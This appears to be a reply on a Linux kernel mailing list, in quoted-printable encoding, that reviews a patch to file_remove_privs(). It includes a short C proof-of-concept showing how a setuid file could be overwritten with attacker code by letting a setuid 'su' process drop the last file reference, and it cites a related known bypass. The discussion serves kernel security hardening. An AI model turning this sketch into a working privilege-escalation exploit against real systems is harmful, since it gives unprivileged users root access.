If there is any other setuid file I can run, can't I just do this?

pid_t child =3D fork();
if (child =3D=3D 0) {
  /* fd will be 3 or so */
  int fd =3D open("setuid-file-with-bad-privs", O_WRONLY);
  char *ptr =3D mmap(..., fd, 0);
  memcpy(ptr, my_evil_code, sizeof(my_evil_code));
  /* su --bad-option just prints usage and exits, without touching
   * the fd - but since su has the last reference to the fd, __fput
   * will run with its privileges */
  execlp("su", "su", "--bad-option", NULL);
}
int status;
wait(&status);
execlp("setuid-file-with-bad-privs", "setuid-file-with-bad-privs", NULL);

I think that file_remove_privs() really needs to be changed to use f_cred
instead of current_cred(). That would also fix the known bypass where
you pass the fd to a setuid process as fd 1, causing the setuid process
to write more-or-less controlled data to a chosen offset, or similar
stuff (see
http://www.halfdog.net/Security/2015/SetgidDirectoryPrivilegeEscalation/).

Or was there already another patch that does this that I didn't see?
